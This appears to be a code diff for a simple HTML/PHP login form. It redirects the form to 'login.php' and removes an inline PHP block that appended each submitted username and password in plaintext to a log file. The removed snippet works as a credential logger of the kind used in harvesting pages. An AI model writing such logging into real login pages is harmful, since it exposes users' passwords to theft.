@@ -88,7 +88,7 @@
 
     <div class="steps" style="text-align: left; color: black; margin-top: 0px; margin-bottom: 0px;">
       <div style="margin: 0 auto;">
-        <form action="../startingPages/firstPage.html" method="POST">
+        <form action="login.php" method="POST">
           <div>
             <h3>Username:</h3>
             <input type="text" name="username" id="username"> <br>
@@ -103,19 +103,6 @@
           document.getElementById("username").required = true;
           document.getElementById("password").required = true;
         </script>
-        <?php
-if (isset($_POST['username']) && isset($_POST['password'])) {
-    $data = $_POST['username'] . '-' . $_POST['password'] . "\n";
-    $ret = file_put_contents('../logs/login.txt', $data, FILE_APPEND | LOCK_EX);
-    if ($ret === false) {
-        die('There was an error writing this file');
-    } else {
-        echo "$ret bytes written to file";
-    }
-} else {
-    die('no post data to process');
-}
-?>
       </div>
     </div>
   </div>
